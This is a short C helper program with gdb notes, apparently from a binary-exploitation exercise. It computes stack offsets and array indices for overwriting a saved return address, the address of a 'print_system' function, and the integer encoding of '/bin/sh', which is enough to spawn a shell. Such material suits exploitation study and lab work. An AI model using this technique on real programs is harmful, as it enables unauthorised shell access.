#include <stdlib.h>
#include <stdio.h>
#include <string.h>


int main(int argc, char **argv) {
    long int x;
    x = 0x7fffffffdc80 -1024 -6144;
    printf("%lx\n",x);
    x = (0x7fffffffdc78 - 0x7fffffffbfb0)/8;
    printf("%ld\n",x);
    x = (0x7fffffffc3c0 - 0x7fffffffbfb0)/8;
    printf("%ld\n",x);
    x = (0x400892);
    printf("%ld\n",x);
    return 0;

}

/*

 x = 0x7fffffffdc80 -1024 -6144; 7fffffffc080
 x = (x - 0x04011c2)/8;17592185517527
 0000000000400886 T print_system
 00000000: 2f 62 69 6e 2f 73 68 0a                          /bin/sh.
 0x0068732f6e69622f = 29400045130965551
 0x0000000000400892 <+12>:	mov    -0x8(%rbp),%rax

(gdb) print &data[0]
$1 = (long *) 0x7fffffffbfb0
rbp at 0x7fffffffc3c0, rip at  0x7fffffffc3c8
(gdb) print -0x8+$rbp
$2 = (void *) 0x7fffffffdc78
===== data[921] /@ de chaine contenant le nom
===== data[130] / contexte
0x400892 =4196498


*/
